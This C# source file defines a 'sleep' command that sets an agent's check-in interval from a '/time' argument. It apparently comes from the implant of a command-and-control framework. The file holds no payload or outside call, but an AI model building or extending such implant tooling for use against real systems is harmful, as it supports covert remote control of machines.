using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    public class SleepCommand : EngineerCommand
    {
        public override string Name => "sleep";

        public override async Task Execute(EngineerTask task)
        {
            if (task.Arguments != null)
            {
                task.Arguments.TryGetValue("/time", out var sleep);

                EngCommBase.Sleep = int.Parse(sleep) * 1000;
                Tasking.FillTaskResults("Sleep set to " + EngCommBase.Sleep / 1000, task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            else
                Tasking.FillTaskResults("error: " + "Sleep setting change failed, please provide a number in seconds like so Sleep 5", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            
        }
    }
}
